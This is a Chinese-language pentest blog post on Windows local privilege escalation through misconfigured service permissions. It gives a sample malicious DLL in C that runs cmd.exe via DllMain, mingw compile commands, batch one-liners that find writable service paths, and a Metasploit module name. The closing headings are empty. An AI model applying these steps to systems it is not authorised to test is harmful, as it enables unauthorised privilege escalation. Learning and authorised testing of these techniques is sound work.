---
title: Windows 提权（三）利用服务权限错误提权
date: 2023-11-20 05:34:21
categories:
- Pentest
tags:
- windows
- LPE
- Info gathering

toc: true
notshow: true
---

# Windows 本地提权
## 利用服务权限错误提权
以管理员/系统身份运行且文件权限不正确的服务可能导致提权，替换该文件或者劫持 DLL（需要可写权限），然后重启该服务即可。
### DLL 劫持
1. 寻找 DLL 劫持利用点
   1. PowerSploit 中的 PowerUp 脚本：Find-PathDLLHijack PowerUp.ps1
   2. Process Monitor : check for "Name Not Found"
2. 编译恶意 DLL
   1. For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
   2. For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"

    windows_dll.c 内容
    ```c
    #include <windows.h>
    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```
3. 寻找权限配置不当的 PATH 目录
   ```bat
    $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

    $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

    $ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
    FOR /F %i in (Servicenames.txt) DO echo %i
    type Servicenames.txt
    FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
   ```

在某些情况下，程序可能自主地加载某些路径的 dll，此时就需要逆向特定的应用才可以判断是否可以进行 DLL 劫持。

参考：
- [Powershell 提权框架-Powerup——平心而论，这个提权工具还是很好用的，看后面实战例子 - bonelee - 博客园](https://www.cnblogs.com/bonelee/p/16227518.html)


### PATH 路径可写
下面的命令可以对服务的 path 路进具备的权限进行排查。
```bat
$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```
两组命令都可以用，但会生成文件。

或者也可以直接使用 msf 中的 exp：
```
exploit/windows/local/service_permissions
```
### windows 10 - CVE-2019-1322 UsoSvc

### Windows XP SP1 - upnphost
